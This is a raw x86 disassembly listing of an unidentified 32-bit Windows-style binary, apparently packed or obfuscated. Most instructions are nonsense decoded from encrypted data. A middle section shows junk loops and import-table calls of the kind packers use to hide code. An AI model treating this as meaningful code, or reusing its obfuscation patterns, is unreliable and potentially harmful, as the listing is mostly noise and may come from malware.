  40a1aa:	outs   dx,BYTE PTR ds:[esi]
  40a1ab:	stos   DWORD PTR es:[edi],eax
  40a1ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1ad:	push   cs
  40a1ae:	mov    al,ds:0x48739fe4
  40a1b3:	xchg   edi,eax
  40a1b4:	out    0xc0,al
  40a1b6:	scas   al,BYTE PTR es:[edi]
  40a1b7:	les    esp,FWORD PTR ds:0xd0013d1b
  40a1bd:	loopne 0x40a15d
  40a1bf:	cs mov esi,0xa18fe41a
  40a1c5:	out    dx,al
  40a1c6:	mov    dh,dh
  40a1c8:	jae    0x40a1b0
  40a1ca:	jp     0x40a17e
  40a1cc:	into   
  40a1cd:	push   ebp
  40a1ce:	inc    esi
  40a1cf:	fild   DWORD PTR [eax]
  40a1d1:	cs ins DWORD PTR es:[edi],dx
  40a1d3:	je     0x40a1b7
  40a1d5:	mov    ecx,0x772e6589
  40a1da:	repnz fistp DWORD PTR ds:0xa54623a2
  40a1e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1e2:	push   ebp
  40a1e3:	cmp    dl,BYTE PTR [eax]
  40a1e5:	loopne 0x40a1e7
  40a1e7:	lods   eax,DWORD PTR ds:[esi]
  40a1e8:	in     eax,0x1e
  40a1ea:	fisubr WORD PTR [esi-0x7e0feeec]
  40a1f0:	mov    bl,0xd1
  40a1f2:	xor    al,0xad
  40a1f4:	retf   0xfc65
  40a1f7:	loope  0x40a222
  40a1f9:	dec    ecx
  40a1fa:	mov    esi,0x342b0b83
  40a1ff:	jae    0x40a1a5
  40a201:	mov    esp,0xcf7097af
  40a206:	add    esp,DWORD PTR [eax+0x5dee2cbf]
  40a20c:	pop    ebp
  40a20d:	mov    ds:0xa1f836e9,al
  40a212:	jo     0x40a204
  40a214:	pusha  
  40a215:	scas   al,BYTE PTR es:[edi]
  40a216:	imul   edx,DWORD PTR [edx],0x2f
  40a219:	repz shr BYTE PTR [ecx+0x70],cl
  40a21d:	shr    dh,cl
  40a21f:	cmp    DWORD PTR [ecx+0x23ca6b12],ecx
  40a225:	scas   eax,DWORD PTR es:[edi]
  40a226:	(bad)  
  40a227:	sti    
  40a228:	xlat   BYTE PTR ds:[ebx]
  40a229:	jl     0x40a234
  40a22b:	adc    DWORD PTR [edi-0x40],eax
  40a22e:	std    
  40a22f:	and    DWORD PTR [ecx-0x2f819628],ecx
  40a235:	jmp    0x565b16e3
  40a23a:	clc    
  40a23b:	fild   QWORD PTR [ebx+ecx*8]
  40a23e:	mov    bx,0xbe24
  40a242:	mov    ecx,0xf0ee1a7
  40a247:	out    dx,eax
  40a248:	pop    ebp
  40a249:	pop    eax
  40a24a:	std    
  40a24b:	cmp    edi,DWORD PTR [edi+0x44]
  40a24e:	test   BYTE PTR fs:[edx],dh
  40a251:	test   al,0xde
  40a253:	or     eax,0x128e1546
  40a258:	repz call 0xe8d0a8d9
  40a25e:	inc    eax
  40a25f:	je     0x40a212
  40a261:	repz mul BYTE PTR [ecx]
  40a264:	aam    0x9d
  40a266:	test   eax,0x23cb13bb
  40a26b:	sbb    al,0x19
  40a26d:	(bad)  
  40a26e:	pop    esi
  40a26f:	pop    ebp
  40a270:	add    al,0xcb
  40a272:	jno    0x40a2ab
  40a274:	push   ebx
  40a275:	mov    eax,ds:0x370f0aa4
  40a27a:	mov    esp,0xd3f9ea90
  40a27f:	ret    0x9fec
  40a282:	dec    edx
  40a283:	daa    
  40a284:	xchg   DWORD PTR [edx+0x397b7720],edi
  40a28a:	add    DWORD PTR [ebp-0x1],ecx
  40a28d:	or     ch,al
  40a28f:	in     eax,dx
  40a290:	dec    ebx
  40a291:	add    al,0x44
  40a293:	test   DWORD PTR [edx+0x45],0x1123d0d7
  40a29a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a29b:	cmp    dh,BYTE PTR [ecx+edi*8-0x13c020b1]
  40a2a2:	pop    ss
  40a2a3:	xchg   esi,eax
  40a2a4:	and    esp,DWORD PTR [eax-0x768bf231]
  40a2aa:	outs   dx,BYTE PTR ds:[esi]
  40a2ab:	mov    eax,ds:0x59d1b4ac
  40a2b0:	int3   
  40a2b1:	add    ebp,DWORD PTR [ebx+edi*4+0xd]
  40a2b5:	gs mov bl,0xd1
  40a2b8:	inc    ebp
  40a2b9:	push   ds
  40a2ba:	push   esi
  40a2bb:	lods   eax,DWORD PTR ds:[esi]
  40a2bc:	mov    ecx,0xf3181ad6
  40a2c1:	xchg   edi,eax
  40a2c2:	adc    al,0xf3
  40a2c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2c5:	dec    ebx
  40a2c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2c7:	mov    esp,0x25f6ebc1
  40a2cc:	sti    
  40a2cd:	or     ch,BYTE PTR [ebx+0x4c5d9427]
  40a2d3:	jne    0x40a2fc
  40a2d5:	adc    eax,0x839d4fdd
  40a2da:	out    dx,al
  40a2db:	inc    esp
  40a2dc:	inc    ebx
  40a2dd:	mov    ebx,0x6c6d4d1d
  40a2e2:	nop
  40a2e3:	inc    ebx
  40a2e4:	mov    al,ds:0x160c9867
  40a2e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2ea:	mov    edx,0xae488f84
  40a2ef:	push   es
  40a2f0:	adc    ah,0x32
  40a2f3:	ficom  DWORD PTR [ebx+0x64]
  40a2f6:	icebp  
  40a2f7:	and    al,0xfc
  40a2f9:	inc    esi
  40a2fa:	add    bl,BYTE PTR [ebp+0xe5fae12]
  40a300:	sub    BYTE PTR [edx-0x3f],ah
  40a303:	out    dx,al
  40a304:	adc    esi,DWORD PTR [eax]
  40a306:	sbb    DWORD PTR [ecx-0x71350415],edi
  40a30c:	or     DWORD PTR [eax+esi*8],0xffffffab
  40a310:	popf   
  40a311:	add    esp,DWORD PTR [ebp-0x63019a6b]
  40a317:	xor    al,0x9d
  40a319:	cli    
  40a31a:	repz loope 0x40a35b
  40a31d:	ja     0x40a356
  40a31f:	pop    ebp
  40a320:	or     eax,0x8ef67270
  40a325:	daa    
  40a326:	mov    BYTE PTR [edx+0x31],al
  40a329:	pop    ebx
  40a32a:	push   ebx
  40a32b:	push   eax
  40a32c:	fcom   QWORD PTR [edi-0x25]
  40a32f:	or     al,0x6c
  40a331:	je     0x40a352
  40a333:	cli    
  40a334:	xor    cl,BYTE PTR [ebx-0x4b]
  40a337:	mov    bh,BYTE PTR [edi-0x15494703]
  40a33d:	(bad)  
  40a33e:	aad    0x9
  40a340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a341:	ss mov dl,0x49
  40a344:	in     al,0x7b
  40a346:	idiv   DWORD PTR [edx]
  40a348:	adc    al,0x88
  40a34a:	shl    esi,1
  40a34c:	cdq    
  40a34d:	retf   
  40a34e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a34f:	inc    esp
  40a350:	inc    edi
  40a351:	push   es
  40a352:	in     al,0x4e
  40a354:	shl    BYTE PTR [eax],0xd1
  40a357:	mov    DWORD PTR [edi+0x5d6d03ee],ebx
  40a35d:	mov    ch,0x12
  40a35f:	fmul   QWORD PTR [edx]
  40a361:	push   0x6f847047
  40a366:	xor    BYTE PTR [esi],0xfc
  40a369:	sahf   
  40a36a:	loop   0x40a36d
  40a36c:	and    BYTE PTR [edi],bl
  40a36e:	and    eax,0xa75bd133
  40a373:	push   ds
  40a374:	cmc    
  40a375:	mov    eax,esp
  40a377:	mov    esp,esi
  40a379:	jg     0x40a36b
  40a37b:	loopne 0x40a39a
  40a37d:	sub    bl,BYTE PTR [edi]
  40a37f:	xchg   esi,eax
  40a380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a381:	xchg   esp,eax
  40a382:	cmp    al,0x7c
  40a384:	fmul   QWORD PTR [ebx+0x76]
  40a387:	xchg   ebx,eax
  40a388:	ror    DWORD PTR [edx],0x52
  40a38b:	mov    WORD PTR [ebx],ds
  40a38d:	retf   
  40a38e:	jo     0x40a379
  40a390:	jbe    0x40a3ef
  40a392:	cli    
  40a393:	int    0x3d
  40a395:	fnstcw WORD PTR [edi-0x32ed8461]
  40a39b:	imul   ecx,DWORD PTR [eax],0xd3799462
  40a3a1:	push   ebx
  40a3a2:	push   ebp
  40a3a3:	popf   
  40a3a4:	mov    eax,DWORD PTR [edi-0x1c4d7909]
  40a3aa:	ret    0xf8f8
  40a3ad:	das    
  40a3ae:	mov    eax,ds:0x103bb279
  40a3b3:	adc    al,0xd4
  40a3b5:	xchg   edx,eax
  40a3b6:	jl     0x40a3e0
  40a3b8:	inc    edx
  40a3b9:	push   ebx
  40a3ba:	aas    
  40a3bb:	daa    
  40a3bc:	sub    DWORD PTR [ebp+eax*8-0x4e07cd37],esp
  40a3c3:	sbb    ebp,DWORD PTR ds:0x74e4443d
  40a3c9:	out    0x3d,eax
  40a3cb:	mov    ds:0x635dc789,al
  40a3d0:	addr16 jl 0x40a441
  40a3d3:	popf   
  40a3d4:	jb     0x40a3ba
  40a3d6:	icebp  
  40a3d7:	adc    al,0xab
  40a3d9:	push   edx
  40a3da:	sub    eax,eax
  40a3dc:	call   0x2f9308aa
  40a3e1:	or     al,0x1e
  40a3e3:	sub    BYTE PTR [ebx-0x1c9b4a6],0x8a
  40a3ea:	or     edx,DWORD PTR [eax-0x2a]
  40a3ed:	lahf   
  40a3ee:	dec    esp
  40a3ef:	lds    edi,FWORD PTR [eax+edx*4-0x173eec10]
  40a3f6:	gs mov eax,0xd445c765
  40a3fc:	cmp    eax,DWORD PTR [ebp+0x45c7f89c]
  40a402:	sar    BYTE PTR [edx],1
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434707
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x434673,0x13
  40a427:	cmp    DWORD PTR ds:0x434673,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x434673,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43478f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x434673
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x434673,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x43477b,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x43477b
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x43477b,edx
  40a477:	cmp    DWORD PTR ds:0x43477b,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x434737
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x434a27
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x43477b,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x4346cb,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434713,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x4346d3,0x4346cf
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x4346f7,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x4346f7,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434783,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x43474b,0x4346fb
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x4346cf,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x4346cf,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x434673,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x43467b,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x43477b,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434797
  40a564:	mov    edx,DWORD PTR ds:0x4347a7
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x4346bf,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x4346bf
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x4346bf,ebx
  40a58c:	cmp    DWORD PTR ds:0x4346bf,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x4346bf,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x4346bf
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x4346bf,ebx
  40a5bc:	cmp    DWORD PTR ds:0x4346bf,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x4346ff
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x4346b7,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x4346cb,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x4346cb,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x4346cb,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x4346cb
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x4346cb,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x434747,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x4346bf,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x43473f
  40a648:	add    DWORD PTR ds:0x434793,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x4346ff,0x434787
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	dec    edx
  40a66d:	dec    esi
  40a66e:	data16 das 
  40a670:	cli    
  40a671:	bnd jle 0x40a6f2
  40a674:	jo     0x40a6ef
  40a676:	jle    0x40a6f6
  40a678:	jne    0x40a6d2
  40a67a:	pop    edi
  40a67b:	pop    ss
  40a67c:	icebp  
  40a67d:	mov    bh,0x7
  40a67f:	xor    ch,dh
  40a681:	pushf  
  40a682:	mov    ecx,0xf3ef2c6e
  40a687:	or     ecx,DWORD PTR [esi+0x2f3ce5c8]
  40a68d:	iret   
  40a68e:	fs xchg edi,eax
  40a690:	(bad)  
  40a691:	call   DWORD PTR [ecx+0x60]
  40a694:	outs   dx,DWORD PTR ds:[esi]
  40a695:	gs sbb al,0x1a
  40a698:	repnz daa 
  40a69a:	jb     0x40a638
  40a69c:	ja     0x40a714
  40a69e:	outs   dx,BYTE PTR ds:[esi]
  40a69f:	fs mov edi,0x1eec349
  40a6a5:	pop    edi
  40a6a6:	mov    al,0xbb
  40a6a8:	push   ebx
  40a6a9:	ss adc cl,bl
  40a6ac:	and    al,0x14
  40a6ae:	std    
  40a6af:	xchg   edx,eax
  40a6b0:	stos   DWORD PTR es:[edi],eax
  40a6b1:	call   0x963121ff
  40a6b6:	cs gs loopne 0x40a71d
  40a6ba:	xor    BYTE PTR [edx+esi*8],dh
  40a6bd:	and    BYTE PTR [ebp-0x40],0x1a
  40a6c1:	xchg   edi,eax
  40a6c2:	int3   
  40a6c3:	dec    esp
  40a6c4:	dec    edi
  40a6c5:	into   
  40a6c6:	sub    eax,0x7dfeca1
  40a6cb:	adc    bl,BYTE PTR [edi]
  40a6cd:	ror    BYTE PTR [ecx+0x2c7c7c6b],0x81
  40a6d4:	dec    ecx
  40a6d5:	pop    ebx
  40a6d6:	adc    DWORD PTR [ebx-0x6b],eax
  40a6d9:	mov    ds:0x39f18938,al
  40a6de:	cli    
  40a6df:	xor    bh,BYTE PTR [ecx]
  40a6e1:	xchg   esp,eax
  40a6e2:	sti    
  40a6e3:	pushf  
  40a6e4:	aaa    
  40a6e5:	rcr    DWORD PTR [edi+0x42],1
  40a6e8:	mov    ebx,0xbd7a280e
  40a6ed:	repz mov es,edi
  40a6f0:	ror    DWORD PTR [ecx],0xb
  40a6f3:	or     eax,0x5b1d6958
  40a6f9:	xchg   ecx,eax
  40a6fa:	std    
  40a6fb:	loopne 0x40a6ab
  40a6fd:	clc    
  40a6fe:	fwait
  40a6ff:	in     eax,0xaa
  40a701:	not    ah
  40a703:	test   BYTE PTR [edi-0x6f],ah
  40a706:	push   esi
  40a707:	cwde   
  40a708:	push   ecx
  40a709:	sbb    eax,0x408e7217
  40a70e:	jb     0x40a713
  40a710:	mov    dh,BYTE PTR ds:0x386f70d1
  40a716:	gs aas 
  40a718:	sbb    al,0x36
  40a71a:	ret    
  40a71b:	mov    ebp,0xa378e5c7
  40a720:	stos   DWORD PTR es:[edi],eax
  40a721:	hlt    
  40a722:	leave  
  40a723:	xor    BYTE PTR [ecx+0x7ff09eb9],ah
  40a729:	mov    ah,0x61
  40a72b:	push   cs
  40a72c:	or     al,0xdc
  40a72e:	xchg   ecx,eax
  40a72f:	pop    ebp
  40a730:	mov    bl,0x6c
  40a732:	sbb    BYTE PTR [ebx-0x1b6d1694],al
  40a738:	inc    esi
  40a739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a73a:	scas   eax,DWORD PTR es:[edi]
  40a73b:	stc    
  40a73c:	or     esp,DWORD PTR [edx-0xa]
  40a73f:	adc    bl,0xf
  40a742:	and    eax,0x798b7f82
  40a747:	xchg   esp,eax
  40a748:	cmp    DWORD PTR [ebp-0x1d],edi
  40a74b:	pop    ecx
  40a74c:	jg     0x40a71c
  40a74e:	xor    DWORD PTR [ecx+ebx*8-0x2254136e],edx
  40a755:	in     eax,dx
  40a756:	out    0x66,al
  40a758:	lahf   
  40a759:	test   eax,0xa2133ced
  40a75e:	jno    0x40a717
  40a760:	mov    ah,0xe8
  40a762:	sub    al,0xf5
  40a764:	pop    eax
  40a765:	repz cwde 
  40a767:	adc    DWORD PTR [edx+0xd],0xffffffd9
  40a76b:	ins    DWORD PTR es:[edi],dx
  40a76c:	sbb    al,0xc
  40a76e:	std    
  40a76f:	xchg   edx,eax
  40a770:	cmp    eax,DWORD PTR [edx-0x226de535]
  40a776:	xchg   edx,eax
  40a777:	mov    dh,0x68
  40a779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a77a:	inc    ebx
  40a77b:	enter  0x2233,0x77
  40a77f:	mov    bh,0x23
  40a781:	iret   
  40a782:	cs lock js 0x40a7ad
  40a786:	push   cs
  40a787:	and    eax,0x2b7717ec
  40a78c:	call   0xb854:0x5f588baa
  40a793:	push   ebx
  40a794:	(bad)  
  40a795:	scas   al,BYTE PTR es:[edi]
  40a796:	stc    
  40a797:	pop    es
  40a798:	inc    ecx
  40a799:	in     al,0x1a
  40a79b:	aam    0xcc
  40a79d:	sbb    BYTE PTR [eax+0x47],bl
  40a7a0:	in     al,0xdc
  40a7a2:	sub    DWORD PTR [eax-0x5e],edi
  40a7a5:	loopne 0x40a762
  40a7a7:	mov    ch,0xed
  40a7a9:	outs   dx,DWORD PTR ds:[esi]
  40a7aa:	and    edx,DWORD PTR ds:0xb1b5c07c
  40a7b0:	ss ins DWORD PTR es:[edi],dx
  40a7b2:	and    eax,0x7cf4e95b
  40a7b7:	call   0x2f08417c
  40a7bc:	jl     0x40a7c7
  40a7be:	fistp  DWORD PTR [eax]
  40a7c0:	xchg   ebx,eax
  40a7c1:	and    al,0xc8
  40a7c3:	sti    
  40a7c4:	jb     0x40a768
  40a7c6:	lahf   
  40a7c7:	push   0xa04fdb20
  40a7cc:	int    0x56
  40a7ce:	xlat   BYTE PTR ds:[ebx]
  40a7cf:	jo     0x40a7ad
  40a7d1:	and    cl,BYTE PTR [edx+0x3f]
  40a7d4:	in     eax,0x7
  40a7d6:	ja     0x40a83c
  40a7d8:	call   FWORD PTR [ecx]
  40a7da:	jne    0x40a76a
  40a7dc:	imul   ebp,DWORD PTR [ebx-0x21],0x6dc7f76d
  40a7e3:	jle    0x40a813
  40a7e5:	push   ecx
  40a7e6:	nop
  40a7e7:	inc    eax
  40a7e8:	mov    edi,?
  40a7ea:	je     0x40a7ba
  40a7ec:	fadd   QWORD PTR [eax+ebp*1+0x74]
  40a7f0:	mov    DWORD PTR [eax+0x64b7c8da],eax
  40a7f6:	add    eax,0xfc8077ca
  40a7fb:	dec    ebx
  40a7fc:	imul   edx,DWORD PTR [ebx],0xaa3837d8
  40a802:	xor    eax,ebx
  40a804:	jle    0x40a7fa
  40a806:	jge    0x40a7a2
  40a808:	ret    
  40a809:	dec    esi
  40a80a:	es pop ebp
  40a80c:	jle    0x40a7e6
  40a80e:	lahf   
  40a80f:	pop    esp
  40a810:	xchg   edx,eax
  40a811:	cld    
  40a812:	dec    ecx
  40a813:	dec    esp
  40a814:	dec    eax
  40a815:	pushf  
  40a816:	mov    al,0x84
  40a818:	sar    DWORD PTR [edi],1
  40a81a:	in     eax,dx
  40a81b:	cmp    DWORD PTR [esi],ebp
  40a81d:	out    0x18,eax
  40a81f:	shl    BYTE PTR [ebp+0x44],0xcf
  40a823:	cmc    
  40a824:	inc    edx
  40a825:	adc    ebx,DWORD PTR [edi+0x18792326]
  40a82b:	enter  0x27e5,0xb5
  40a82f:	mov    ebx,0x53983766
  40a834:	add    eax,ecx
  40a836:	xchg   edx,eax
  40a837:	iret   
  40a838:	or     DWORD PTR [edx+0x6911a751],ebp
  40a83e:	and    DWORD PTR [ecx],edi
  40a840:	mov    ecx,0x91470dcc
  40a845:	int    0xa3
  40a847:	aaa    
  40a848:	nop
  40a849:	mov    bh,0x36
  40a84b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a84c:	hlt    
  40a84d:	dec    edi
  40a84e:	jno    0x40a800
  40a850:	sbb    bh,bh
  40a852:	sbb    eax,0xf8a4d5fc
  40a857:	fwait
  40a858:	ds sub eax,0xb1b34102
  40a85e:	push   esp
  40a85f:	cmp    DWORD PTR [edx-0x1c],eax
  40a862:	or     ecx,esi
  40a864:	out    0x94,eax
  40a866:	pop    ecx
  40a867:	push   eax
  40a868:	jno    0x40a880
  40a86a:	jnp    0x40a836
  40a86c:	sbb    DWORD PTR [ecx+ecx*1],ebx
  40a86f:	mov    edi,0x1140e13d
  40a874:	jno    0x40a8a5
  40a876:	rol    BYTE PTR [ebp-0x67d7b7d0],1
  40a87c:	cmp    eax,0xb877dfb0
  40a881:	sbb    DWORD PTR [edx-0xf7df8fe],ecx
  40a887:	out    dx,eax
  40a888:	mov    al,cl
  40a88a:	cmp    al,BYTE PTR [ebx]
  40a88c:	int3   
  40a88d:	xchg   esp,edx
  40a88f:	adc    BYTE PTR [ebx+eiz*1],bh
  40a892:	ds hlt 
  40a894:	xlat   BYTE PTR ds:[ebx]
  40a895:	mov    cl,0x93
  40a897:	nop
  40a898:	xchg   BYTE PTR [edx+0x54a0ef88],bl
  40a89e:	fs repnz mov edx,0xc35ee2cd
  40a8a5:	imul   DWORD PTR [eax]
  40a8a7:	add    esp,DWORD PTR [edi]
  40a8a9:	xor    eax,0x83148940
  40a8ae:	fst    QWORD PTR [ebp-0x13a18a41]
  40a8b4:	sbb    ah,dh
  40a8b6:	xchg   edi,eax
  40a8b7:	inc    edx
  40a8b8:	jb     0x40a8e9
  40a8ba:	pop    esi
  40a8bb:	mov    WORD PTR ds:0xb25c7951,cs
  40a8c1:	xor    eax,0x41c503d9
  40a8c6:	push   cs
  40a8c7:	in     al,dx
  40a8c8:	sbb    eax,0xe9bb503f
  40a8cd:	mov    esp,0xfccd813d
  40a8d2:	xchg   DWORD PTR [ebx],ebp
  40a8d4:	repz and eax,0x50e00a13
  40a8da:	push   0xf1b050f3
  40a8df:	mov    edi,0xb8c8d4c1
  40a8e4:	mov    DWORD PTR [edx+0x4e],ecx
  40a8e7:	pop    ss
  40a8e8:	sub    BYTE PTR [ebx],dh
  40a8ea:	jnp    0x40a939
  40a8ec:	cmp    BYTE PTR [edi],cl
  40a8ee:	je     0x40a960
  40a8f0:	xchg   edx,eax
  40a8f1:	jg     0x40a8ee
  40a8f3:	or     ebx,esi
  40a8f5:	sbb    eax,0xb7b78b38
  40a8fa:	jmp    0x54d4dc95
  40a8ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a901:	cld    
  40a902:	cmc    
  40a903:	xor    cl,ch
  40a905:	popa   
  40a906:	fldcw  WORD PTR [eax-0xe]
  40a909:	sar    DWORD PTR [edi],1
  40a90b:	mov    ebx,0x81db5bb1
  40a910:	fdivr  QWORD PTR [ebx+0x2a85997]
  40a916:	jle    0x40a8af
  40a918:	xlat   BYTE PTR ds:[ebx]
  40a919:	rol    BYTE PTR [esi],0x77
  40a91c:	jmp    0xbdbd53e9
  40a921:	jmp    0xfbff5901
  40a926:	cmp    cl,BYTE PTR [edi+ecx*1+0x1c263257]
  40a92d:	xlat   BYTE PTR ds:[ebx]
  40a92e:	jle    0x40a8d6
  40a930:	mov    cl,BYTE PTR [ebx]
  40a932:	and    eax,esp
  40a934:	dec    eax
  40a935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a936:	add    DWORD PTR [eax+0x5bd52f],esi
  40a93c:	adc    al,0xe1
  40a93e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a93f:	idiv   DWORD PTR [ebp-0x619cd9e5]
  40a945:	adc    BYTE PTR [ebx+0x58],0xa6
  40a949:	arpl   WORD PTR ds:0xf15e0a6c,ax
  40a94f:	sbb    DWORD PTR [ebp+0x44],ebp
  40a952:	mov    ebp,0x6aec98b3
  40a957:	pop    ebp
  40a958:	and    edx,DWORD PTR [ecx-0x3753f7bd]
  40a95e:	pop    ebx
  40a95f:	leave  
  40a960:	mov    al,ds:0xb8b9425b
  40a965:	pop    edi
  40a966:	lods   eax,DWORD PTR ds:[esi]
  40a967:	shl    BYTE PTR [edi],cl
  40a969:	mov    al,0x4d
  40a96b:	inc    eax
  40a96c:	jge    0x40a8fb
  40a96e:	mov    al,0x62
  40a970:	call   0x7f68:0x4974de65
  40a977:	pop    ds
  40a978:	leave  
  40a979:	lods   al,BYTE PTR ds:[esi]
  40a97a:	adc    bl,BYTE PTR [edi+0x4d373565]
  40a980:	mov    bl,0x81
  40a982:	jbe    0x40a983
  40a984:	pusha  
  40a985:	(bad)  
  40a987:	pop    ds
  40a988:	inc    eax
  40a989:	arpl   WORD PTR [ebp-0x70],di
  40a98c:	inc    eax
  40a98d:	adc    bh,dh
  40a98f:	add    DWORD PTR [ebx+0x7f],ebp
  40a992:	test   cl,0x60
  40a995:	outs   dx,DWORD PTR ds:[esi]
  40a996:	adc    eax,0xc7d1184
  40a99b:	pushf  
  40a99c:	cmp    al,0x0
  40a99e:	or     al,0x63
  40a9a0:	cmp    cl,BYTE PTR [ebx+0x117d5801]
  40a9a6:	inc    ebx
  40a9a7:	stos   DWORD PTR es:[edi],eax
  40a9a8:	jl     0x40a93e
  40a9aa:	mov    cl,0x34
  40a9ac:	addr16 std 
  40a9ae:	(bad)
  40a9b2:	mov    dh,0xd8
  40a9b4:	in     al,0x84
  40a9b6:	loopne 0x40a998
  40a9b8:	xchg   ecx,eax
  40a9b9:	shl    BYTE PTR [esi],1
  40a9bb:	scas   al,BYTE PTR es:[edi]
  40a9bc:	scas   eax,DWORD PTR es:[edi]
  40a9bd:	dec    edx
  40a9be:	test   BYTE PTR [eax+0x4],cl
  40a9c1:	sbb    al,0xe9
  40a9c3:	mov    dh,0x4e
  40a9c5:	adc    eax,0xd257b607
  40a9ca:	fistp  QWORD PTR [ebp+0x2b]
  40a9cd:	jmp    0x40aa01
  40a9cf:	ja     0x40a9f6
  40a9d1:	ss hlt 
  40a9d3:	sub    ebp,edi
  40a9d5:	popa   
  40a9d6:	hlt    
  40a9d7:	jne    0x40a972
  40a9d9:	xor    al,0x7e
  40a9db:	or     eax,0x1f16ed2a
  40a9e0:	nop
  40a9e1:	(bad)  
  40a9e2:	pushf  
  40a9e3:	dec    esi
  40a9e4:	inc    ecx
  40a9e5:	jb     0x40a9d8
  40a9e7:	pop    ecx
  40a9e8:	out    0x63,eax
